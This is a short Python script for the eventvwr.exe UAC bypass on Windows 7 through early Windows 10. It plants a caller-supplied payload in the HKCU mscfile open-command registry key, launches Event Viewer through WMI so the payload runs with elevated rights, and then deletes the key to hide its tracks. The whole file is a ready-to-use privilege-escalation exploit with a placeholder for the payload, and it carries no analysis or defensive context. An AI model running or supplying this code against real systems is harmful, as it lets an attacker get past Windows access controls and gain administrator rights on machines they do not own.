"""
Works from: Windows 7 (7600)
Fixed in: Windows 10 RS2 (15031)
"""
import os
import wmi
import time
import winreg

wmi = wmi.WMI()

def eventvwr(payload):
	print("Payload: {}".format(payload))
	print("Attempting to create registry key")
	try:
		key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))				
		winreg.SetValueEx(key,None,0,winreg.REG_SZ,payload)
		winreg.CloseKey(key)
	except Exception as error:
		print("Unable to create key")
	else:
		print("Registry key created")

	print("Pausing for 5 seconds before executing")
	time.sleep(5)

	print("Attempting to create process")
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start eventvwr.exe",ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
		if (result[1] == 0):
			print("Process started successfully")
		else:
			print("Problem creating process")
	except Exception as error:
		print("Problem creating process")
	
	print("Pausing for 5 seconds before cleaning")
	time.sleep(5)

	print("Attempting to remove registry key")
	try:
		winreg.DeleteKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\mscfile\shell\open\command"))
	except Exception as error:
		print("Unable to delete key")
	print("Registry key was deleted")
payload="insert your payload here"
eventvwr(payload)
